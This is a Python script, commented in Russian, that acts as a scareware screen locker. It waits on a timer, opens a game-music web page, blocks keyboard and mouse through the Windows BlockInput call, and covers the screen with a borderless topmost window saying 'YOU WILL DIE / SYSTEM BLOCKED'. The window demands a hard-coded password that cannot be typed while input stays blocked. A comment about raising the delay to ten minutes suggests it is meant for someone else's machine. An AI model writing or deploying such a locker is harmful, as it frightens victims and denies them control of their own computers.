import ctypes
import time
import tkinter as tk
import webbrowser
import threading

# Настройки
PASSWORD = "1601"
TIMER_SECONDS = 15  # 15 секунд для теста, потом ставь 600

# Запускаем музыку (откроется браузер)
def play_music():
    try:
        webbrowser.open("https://ost-watch-dogs-2.skysound7.com/t/06067162842068930321-ost-watch-dogs-2-main-menu-theme/")
    except:
        pass

# Блокируем клавиатуру и мышь намертво
def block_input(block=True):
    ctypes.windll.user32.BlockInput(block)

# Окно блокировки
def lock_screen():
    win = tk.Toplevel()
    win.attributes('-fullscreen', True)
    win.attributes('-topmost', True)
    win.configure(bg='black')
    win.overrideredirect(True)
    
    # Страшная надпись
    tk.Label(win, text="ВЫ УМРЁТЕ\nСИСТЕМА ЗАБЛОКИРОВАНА", 
             fg='red', bg='black', font=('Courier', 36, 'bold')).pack(expand=True, pady=50)
    
    tk.Label(win, text="ВВЕДИТЕ ПАРОЛЬ:", 
             fg='red', bg='black', font=('Courier', 24)).pack(pady=20)
    
    entry = tk.Entry(win, show="*", font=('Courier', 24), 
                     bg='black', fg='red', insertbackground='red')
    entry.pack(pady=10)
    
    status = tk.Label(win, text="", fg='red', bg='black', font=('Courier', 14))
    status.pack(pady=10)
    
    def check_password(event=None):
        if entry.get() == PASSWORD:
            block_input(False)  # Разблокируем клавиатуру
            win.destroy()
            root.destroy()
        else:
            status.config(text="НЕВЕРНЫЙ ПАРОЛЬ!")
            entry.delete(0, tk.END)
    
    entry.bind('<Return>', check_password)
    entry.focus_set()
    return win

# Главный поток
if __name__ == "__main__":
    # Запускаем музыку в фоне
    threading.Thread(target=play_music, daemon=True).start()
    
    # Таймер до активации
    time.sleep(TIMER_SECONDS)
    
    # Блокируем ввод
    block_input(True)
    
    # Создаём окно
    root = tk.Tk()
    root.withdraw()
    lock_screen()
    root.mainloop()
